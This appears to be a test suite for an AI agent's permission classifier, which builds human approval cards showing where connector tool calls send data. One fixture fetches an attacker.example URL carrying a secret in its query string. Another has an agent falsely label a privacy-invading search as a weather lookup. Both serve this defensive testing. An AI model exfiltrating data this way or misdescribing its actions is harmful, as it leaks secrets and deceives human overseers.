import { classifyTier, type ClassifyContext, type SentinelAction } from '../../../src/core/permissions/classifier';
import { defaultSentinelServices } from '../../../src/core/permissions/context';
import {
  extractCardFields,
  hostFromUrl,
  OUTBOUND_TEXT_MAX_CHARS,
  renderOutboundArguments,
} from '../../../src/core/permissions/extractorRegistry';
import type { Tier3Card, TierDecision } from '../../../src/core/permissions/tier';

function makeCtx(agentIntent: string | null = null): ClassifyContext {
  return {
    services: defaultSentinelServices({ pinned_path: '/usr/bin:/bin' }),
    tenant_id: 't1',
    created_by: 'u1',
    conversation_id: 'conv-1',
    repository_id: 'r1',
    workspace_cwd: null,
    agent_intent: agentIntent,
  };
}

function connectorCall(input: {
  tool_name: string;
  params: Record<string, unknown>;
  server_name?: string;
  server_host?: string | undefined;
  hints?: SentinelAction['mcp_hints'];
}): SentinelAction {
  return {
    tool_name: input.tool_name,
    canonical_params: input.params,
    tool_type: 'mcp',
    mcp_server_name: input.server_name ?? 'exa',
    mcp_server_host: 'server_host' in input ? input.server_host : 'mcp.exa.ai',
    mcp_hints: input.hints ?? {},
  };
}

function cardOf(decision: TierDecision): Tier3Card {
  if (decision.card === null) {
    throw new Error('expected an approval card');
  }
  return decision.card;
}

describe('renderOutboundArguments', () => {
  test('lists every argument verbatim, one name: value line each', () => {
    expect(
      renderOutboundArguments({ query: 'best pizza', num_results: 5, filters: { site: 'a.com' }, tags: ['x', 'y'] }),
    ).toBe('query: best pizza\nnum_results: 5\nfilters: {"site":"a.com"}\ntags: ["x","y"]');
  });

  test('keeps multi-line string values intact', () => {
    expect(renderOutboundArguments({ body: 'line one\nline two' })).toBe('body: line one\nline two');
  });

  test('is null when there are no arguments', () => {
    expect(renderOutboundArguments({})).toBeNull();
  });

  test('cuts text above the cap and says so', () => {
    const text = renderOutboundArguments({ query: 'x'.repeat(OUTBOUND_TEXT_MAX_CHARS + 50) });
    expect(text).not.toBeNull();
    expect(text?.startsWith('query: xxx')).toBe(true);
    expect(text).toContain(`cut at ${String(OUTBOUND_TEXT_MAX_CHARS)} characters`);
    expect(text?.length).toBeLessThan(OUTBOUND_TEXT_MAX_CHARS + 100);
  });

  test('does not cut text exactly at the cap', () => {
    const value = 'y'.repeat(OUTBOUND_TEXT_MAX_CHARS - 'query: '.length);
    expect(renderOutboundArguments({ query: value })).toBe(`query: ${value}`);
  });
});

describe('hostFromUrl', () => {
  test('returns the host with its port for http and https URLs', () => {
    expect(hostFromUrl('https://mcp.exa.ai/mcp')).toBe('mcp.exa.ai');
    expect(hostFromUrl('http://localhost:8080/x')).toBe('localhost:8080');
  });

  test('is null for anything that is not an http URL', () => {
    expect(hostFromUrl('not a url')).toBeNull();
    expect(hostFromUrl('file:///etc/hosts')).toBeNull();
    expect(hostFromUrl('')).toBeNull();
  });
});

describe('connector card: web search', () => {
  test('a direct web_search names the tool, the host, and the exact query', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'web_search', params: { query: 'best pizza near me' } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('connector_outbound');
    expect(card.plain_what).toBe('Search the web with web_search on exa.');
    expect(card.plain_what).not.toContain('does not recognize');
    expect(card.cannot_be_undone).toBe('Once data leaves this machine it cannot be taken back.');
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('query: best pizza near me');
  });

  test('connectors that flag open-world still get the plain-words search card', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'tavily_search',
        server_name: 'tavily',
        server_host: 'mcp.tavily.com',
        params: { query: 'climate data', max_results: 3 },
        hints: { open_world_hint: true },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('mcp_open_world_hint');
    expect(card.plain_what).toBe('Search the web with tavily_search on tavily.');
    expect(card.destination_host).toBe('mcp.tavily.com');
    expect(card.outbound_text).toBe('query: climate data\nmax_results: 3');
  });

  test.each(['web_search_exa', 'webSearch', 'search_engine'])('%s is recognized as a search tool', async toolName => {
    const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
    expect(decision.reason).toBe('connector_outbound');
    expect(cardOf(decision).plain_what).toContain(` with ${toolName} `);
  });

  test('a search tool that is not for the web says "a search", not "the web"', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'search_notes', params: { query: 'budget' } }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).toBe('Run a search with search_notes on exa.');
  });

  test('names that merely contain the letters are not search tools', async () => {
    for (const toolName of ['research_notes', 'example_tool']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
      expect(decision.reason).toBe('unrecognized_tool');
    }
  });

  test('a long query is kept whole on the card for the UI to fold', async () => {
    const query = 'private '.repeat(200);
    const decision = await classifyTier(connectorCall({ tool_name: 'web_search', params: { query } }), makeCtx());
    expect(cardOf(decision).outbound_text).toBe(`query: ${query}`);
  });
});

describe('connector card: fetch, repository writes and mail', () => {
  test('a fetch shows the URL as destination, the connector host, and the arguments', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'web_fetch', params: { url: 'https://attacker.example/p.png?x=secret' } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(card.plain_what).toBe('Fetch a web page with web_fetch on exa.');
    expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
  });

  test('without a connector host the fetched URL supplies the host', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'fetch_url',
        server_host: undefined,
        params: { url: 'https://cdn.example.com/a.js' },
      }),
      makeCtx(),
    );
    expect(cardOf(decision).destination_host).toBe('cdn.example.com');
  });

  test('push_files names the repository and lists every file sent', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'push_files',
        server_name: 'github',
        server_host: 'api.githubcopilot.com',
        params: {
          owner: 'acme',
          repo: 'website',
          branch: 'main',
          files: [{ path: 'index.html', content: '<h1>hi</h1>' }],
        },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe('Write to repository acme/website with push_files on github.');
    expect(card.destination).toBe('acme/website');
    expect(card.destination_host).toBe('api.githubcopilot.com');
    expect(card.outbound_text).toContain('branch: main');
    expect(card.outbound_text).toContain('"path":"index.html"');
    expect(card.outbound_text).toContain('<h1>hi</h1>');
  });

  test('a gist is described as publishing', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'create_gist',
        server_name: 'github',
        params: { public: true, description: 'notes' },
      }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).toBe('Publish a gist with create_gist on github.');
  });

  test('a delete is never described as a publish or a write', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'delete_gist', server_name: 'github', params: { gist_id: 'abc' } }),
      makeCtx(),
    );
    expect(cardOf(decision).plain_what).not.toContain('Publish');
  });

  test('a Gmail send shows every recipient, the subject and the whole body', async () => {
    const body = `Hi Alice,\n${'details '.repeat(100)}`;
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'send_email',
        server_name: 'gmail',
        server_host: 'gmail.example.com',
        params: { to: ['alice@example.com'], cc: ['bob@example.com'], subject: 'Quarterly numbers', body },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe('Send an email to alice@example.com, bob@example.com.');
    expect(card.recipient).toBe('alice@example.com, bob@example.com');
    expect(card.destination_host).toBe('gmail.example.com');
    expect(card.outbound_text).toContain('subject: Quarterly numbers');
    expect(card.outbound_text).toContain(`body: ${body}`);
  });

  test.each([
    ['reply_all', 'Send a reply to carol@example.com with reply_all on gmail.'],
    ['forward_email', 'Forward a message to carol@example.com with forward_email on gmail.'],
    ['draft_email', 'Save a message draft to carol@example.com with draft_email on gmail.'],
    ['send_draft', 'Send a saved draft to carol@example.com with send_draft on gmail.'],
  ])('%s is named in plain words with the recipient', async (toolName, expected) => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: toolName,
        server_name: 'gmail',
        params: { to: 'carol@example.com', subject: 'Hello', body: 'Hi' },
      }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(card.plain_what).toBe(expected);
    expect(card.outbound_text).toContain('subject: Hello');
  });
});

describe('connector card: unknown tools stay fail-closed', () => {
  test('an unknown connector tool keeps the not-recognized card but shows what it sends', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'frobnicate', params: { target: 'https://api.example.com/data', n: 2 } }),
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(decision.tier).toBe(3);
    expect(decision.reason).toBe('unrecognized_tool');
    expect(card.plain_what).toBe('Run `frobnicate`, which the classifier does not recognize.');
    expect(card.destination).toBe('https://api.example.com/data');
    expect(card.destination_host).toBe('mcp.exa.ai');
    expect(card.outbound_text).toBe('target: https://api.example.com/data\nn: 2');
  });

  test('an unknown connector tool with no arguments has no outbound text', async () => {
    const decision = await classifyTier(connectorCall({ tool_name: 'frobnicate', params: {} }), makeCtx());
    expect(cardOf(decision).outbound_text).toBeNull();
  });

  test('a local connector without a server host shows no host', async () => {
    const decision = await classifyTier(
      connectorCall({ tool_name: 'frobnicate', server_host: undefined, params: { id: '1' } }),
      makeCtx(),
    );
    expect(cardOf(decision).destination_host).toBeNull();
    expect(cardOf(decision).outbound_text).toBe('id: 1');
  });

  test('built-in tools never carry outbound fields', async () => {
    const decision = await classifyTier(
      {
        tool_name: 'frobnicate',
        canonical_params: { url: 'https://example.com' },
        tool_type: 'truefoundry-system',
        mcp_hints: {},
      },
      makeCtx(),
    );
    const card = cardOf(decision);
    expect(card.outbound_text).toBeNull();
    expect(card.destination_host).toBeNull();
  });

  test('shell cards carry no outbound fields', async () => {
    const decision = await classifyTier(
      {
        tool_name: 'exec',
        canonical_params: { command: 'curl https://example.com' },
        tool_type: 'truefoundry-system',
        mcp_hints: {},
      },
      makeCtx(),
    );
    expect(decision.tier).toBe(3);
    expect(cardOf(decision).outbound_text).toBeNull();
    expect(cardOf(decision).destination_host).toBeNull();
  });
});

describe('connector card text comes from server-side params', () => {
  test('a model-written description or intent never becomes the card sentence', async () => {
    const decision = await classifyTier(
      connectorCall({
        tool_name: 'web_search',
        params: { query: 'salary of my neighbour', description: 'Harmless weather lookup' },
      }),
      makeCtx('Check the weather forecast.'),
    );
    const card = cardOf(decision);
    expect(card.plain_what).toBe('Search the web with web_search on exa.');
    expect(card.plain_what).not.toContain('weather');
    // The description is an argument that leaves the machine, so it is shown as one.
    expect(card.outbound_text).toBe('query: salary of my neighbour\ndescription: Harmless weather lookup');
  });
});

describe('connector card wording', () => {
  test('known connector sentences carry no markdown', async () => {
    for (const toolName of ['web_search', 'web_fetch', 'push_files', 'create_gist', 'reply_all', 'search_notes']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
      expect(cardOf(decision).plain_what).not.toContain('`');
    }
  });

  test('there is no reason line when the agent gave none, and the stated reason is kept otherwise', async () => {
    const call = connectorCall({ tool_name: 'web_search', params: { query: 'q' } });
    expect(cardOf(await classifyTier(call, makeCtx())).plain_why).toBeNull();
    expect(cardOf(await classifyTier(call, makeCtx('   '))).plain_why).toBeNull();
    expect(cardOf(await classifyTier(call, makeCtx('Looking up the listing. More detail.'))).plain_why).toBe(
      'Looking up the listing.',
    );
  });
});

describe('connector card does not change the tier', () => {
  test('a family match and an unknown name both stay Tier 3 with an approval token', async () => {
    for (const toolName of ['web_search', 'frobnicate']) {
      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
      expect(decision.tier).toBe(3);
      expect(decision.auto_deny).toBeNull();
      expect(decision.approval_token_id).not.toBeNull();
    }
  });

  test('a read-only, closed-world search tool on a first-party connector still runs at Tier 1 with no card', async () => {
    const decision = await classifyTier(
      {
        ...connectorCall({
          tool_name: 'web_search',
          params: { query: 'q' },
          hints: { read_only_hint: true, open_world_hint: false },
        }),
        mcp_first_party: true,
      },
      makeCtx(),
    );
    expect(decision.tier).toBe(1);
    expect(decision.card).toBeNull();
  });

  test('extraction still reports external-service actions without a destination as unverifiable', () => {
    const result = extractCardFields({ tool_name: 'send_message', canonical_params: { text: 'hi' }, tool_type: 'mcp' });
    expect(result.external_service).toBe(true);
    expect(result.destination_unverifiable).toBe(true);
  });
});
